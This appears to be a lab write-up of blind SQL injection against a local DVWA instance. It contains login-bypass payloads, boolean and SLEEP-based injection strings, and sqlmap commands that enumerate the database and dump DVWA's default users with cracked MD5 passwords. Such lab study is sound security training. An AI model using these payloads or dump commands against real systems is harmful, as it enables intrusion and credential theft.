# Blind SQL Injection — Manual Testing Notes

## Target

**URL:** `http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit`
**Security Level:** Low
**Parameter:** `id` (GET)

---

## Phase 1 — Classic SQLi Attempts (Login Form — Unsuccessful)

These payloads were first attempted on the DVWA login form to test for authentication bypass. None were successful, indicating the login form was not vulnerable in this configuration.

```
' OR '1'='1' --
' OR '1'='1'#
admin'--
' OR 1=1#
" OR "1"="1
' OR 'x'='x
```

**Result:** All rejected. No authentication bypass achieved.
**Decision:** Pivoted to the Blind SQLi module.

---

## Phase 2 — Boolean Confirmation on Blind SQLi Parameter

The `id` parameter was tested with valid and invalid inputs to detect boolean-based blind SQLi behavior.

### True Condition (valid input)
```
Input:    1
Response: User ID exists in the database.
```

### False Condition (invalid input)
```
Input:    999999
Response: (no output returned)
```

### Boolean injection test (manual)
```
Input:    1' AND '1'='1
Response: User ID exists in the database.   ← TRUE branch returned

Input:    1' AND '1'='2
Response: (no output)                        ← FALSE branch — confirms injection
```

**Conclusion:** The parameter is injectable. User input is being embedded directly into the SQL query. The application's output changes based on whether the injected condition evaluates to true or false.

---

## Phase 3 — Time-Based Verification (Optional Confirmation)

Time-based blind SQLi can be used as an alternative confirmation method when no visual boolean difference exists.

```
Input:    1' AND SLEEP(5)--
Expected: Page takes ~5 seconds to load → confirms injection
```

> Note: Boolean-based was sufficient in this lab. Time-based was not required to proceed.

---

## Phase 4 — SQLMap Enumeration

Once the injectable parameter was confirmed manually, SQLMap was used to automate enumeration.

### Command 1 — Enumerate databases
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session_id>; security=low" \
       --dbs \
       --batch
```

**Discovered:**
```
[*] dvwa
[*] information_schema
```

---

### Command 2 — Enumerate tables in dvwa
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session_id>; security=low" \
       -D dvwa \
       --tables \
       --batch
```

**Discovered:**
```
[*] guestbook
[*] users
```

---

### Command 3 — Enumerate columns in users table
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session_id>; security=low" \
       -D dvwa -T users \
       --columns \
       --batch
```

**Columns of interest:**
```
[*] user_id
[*] user
[*] password
```

---

### Command 4 — Dump credentials and crack hashes
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your_session_id>; security=low" \
       -D dvwa -T users \
       -C user_id,user,password \
       --dump \
       --batch
```

**SQLMap identified MD5 hashes and cracked them via built-in dictionary.**

**Results (replace with your actual output):**

| user_id | user    | password (MD5 hash)              | plaintext |
|---------|---------|----------------------------------|-----------|
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | password  |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 | abc123    |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | charley   |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein   |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | password  |

---

## Observations

- The `id` parameter accepts user-supplied input with no sanitization or type validation
- The application's true/false response difference is clearly visible, making boolean-based blind SQLi trivial to confirm manually
- SQLMap's `--batch` flag automates all prompts — in a real engagement you would review each prompt manually
- MD5 without a salt is effectively broken for password storage — rainbow table and dictionary attacks are near-instant
- Replacing `<your_session_id>` with a live PHPSESSID from an authenticated browser session is required for SQLMap to access the protected endpoint
